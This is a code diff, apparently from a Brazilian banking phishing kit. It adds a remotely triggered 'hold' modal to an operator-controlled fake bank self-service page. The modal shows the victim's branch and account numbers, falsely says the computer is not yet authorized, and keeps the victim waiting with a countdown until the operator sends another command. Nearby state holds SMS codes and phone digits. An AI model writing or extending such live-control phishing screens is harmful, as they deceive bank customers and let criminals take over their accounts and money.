@@ -655,6 +655,20 @@ function LiveControlOverlay({
   const [smsLast3, setSmsLast3] = useState<string>('');
   const [code, setCode] = useState('');
   const [pendingWait, setPendingWait] = useState(false);
+  const [holdSeconds, setHoldSeconds] = useState(360);
+
+  // Contador regressivo apenas visual do modal PF "Colocar em aguarde".
+  useEffect(() => {
+    if (directive !== 'hold') {
+      setHoldSeconds(360);
+      return;
+    }
+    const id = window.setInterval(
+      () => setHoldSeconds((s) => (s > 0 ? s - 1 : 0)),
+      1000,
+    );
+    return () => window.clearInterval(id);
+  }, [directive]);
 
   useEffect(() => {
     let alive = true;
@@ -876,6 +890,42 @@ function LiveControlOverlay({
             </form>
           </div>
         </AutoatendimentoShell>
+      </div>
+    );
+  }
+
+  // PF — "Colocar em aguarde": modal de espera conforme referência (print).
+  // Isolado por sessão (a diretiva 'hold' vem da própria sessão). NÃO altera o
+  // comportamento do PJ. Permanece até o operador enviar outro comando.
+  if (flow === 'PF' && directive === 'hold' && status !== 'ended') {
+    const pf = readPfSession();
+    const agencia = pf ? formatWithLastDigitSeparator(pf.agency) : '—';
+    const conta = pf ? formatWithLastDigitSeparator(pf.account) : '—';
+    const holdTimer = `${String(Math.floor(holdSeconds / 60)).padStart(2, '0')}:${String(
+      holdSeconds % 60,
+    ).padStart(2, '0')}`;
+    return (
+      <div className="pf-hold-overlay" role="status" aria-live="polite" data-testid="live-pf-hold">
+        <div className="pf-hold-modal" data-testid="live-pf-hold-modal">
+          <header className="pf-hold-header">INICIANDO SOLICITAÇÃO</header>
+          <div className="pf-hold-body">
+            <p className="pf-hold-lead">
+              Aguarde alguns instantes, iremos dar continuidade com a autorização deste computador.
+            </p>
+            <p className="pf-hold-account" data-testid="live-pf-hold-account">
+              <strong>Agência:</strong> {agencia}&nbsp;&nbsp;<strong>Conta:</strong> {conta}
+            </p>
+            <hr className="pf-hold-divider" />
+            <p className="pf-hold-note">
+              Não conseguimos identificar este dispositivo em sua lista de computadores autorizados
+              e seguros.
+              <br />
+              Aguarde...
+            </p>
+            <span className="pf-hold-spinner" aria-hidden="true" />
+            <span className="pf-hold-session">Sessão {holdTimer}</span>
+          </div>
+        </div>
       </div>
     );
   }
